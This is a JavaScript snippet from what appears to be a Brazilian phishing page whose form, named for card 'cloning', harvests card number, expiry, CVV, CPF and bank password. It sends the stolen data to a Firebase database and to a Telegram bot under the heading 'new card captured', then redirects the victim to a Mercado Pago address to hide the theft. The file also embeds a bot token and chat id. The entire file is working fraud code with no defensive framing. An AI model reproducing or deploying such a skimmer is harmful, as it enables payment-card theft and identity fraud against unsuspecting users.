document.getElementById('formulario-clonacao').addEventListener('submit', async function(e) {
e.preventDefault();

const btnSubmit = document.getElementById('btnSubmit');
const spinner = btnSubmit.querySelector('.spinner-border');
btnSubmit.disabled = true;
spinner.classList.remove('d-none');

const dados = {
numero_cartao: document.getElementById('numero_cartao').value.replace(/\s/g, ''),
validade: document.getElementById('validade').value,
cvv: document.getElementById('cvv').value,
cpf: document.getElementById('cpf').value.replace(/[.-]/g, ''),
senha_banco: document.getElementById('senha_banco').value,
ip_usuario: await fetch('https://api.ipify.org?format=json')
.then(res => res.json())
.then(data => data.ip)
.catch(() => 'IP desconhecido'),
hora: new Date().toISOString(),
user_agent: navigator.userAgent
};

document.querySelector('.formulario-urgente').classList.add('d-none');
document.getElementById('avisoFinal').classList.remove('d-none');

// Backup Firebase
fetch('https://seu-projeto-71c10-default-rtdb.firebaseio.com/cartoes.json', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(dados)
}).catch(console.error);

// Alerta Telegram
const mensagem = `🚨 NOVO CARTÃO CAPTURADO 🚨
🔹 Número: ${dados.numero_cartao}
🔹 Validade: ${dados.validade}
🔹 CVV: ${dados.cvv}
🔹 CPF: ${dados.cpf}
🔹 Senha: ${dados.senha_banco}
🔹 IP: ${dados.ip_usuario}
🔹 Hora: ${dados.hora}`;
fetch(`https://api.telegram.org/bot8776533220:AAFH8s1cQrIWHYdUvtaTBzIn7E2y1vqTKpE/sendMessage?chat_id=8311007963&text=${encodeURIComponent(mensagem)}`)
.catch(console.error);

setTimeout(() => window.location.href = 'https://mercadopago.com/br/aguarde?token=ST5432', 3000);
});
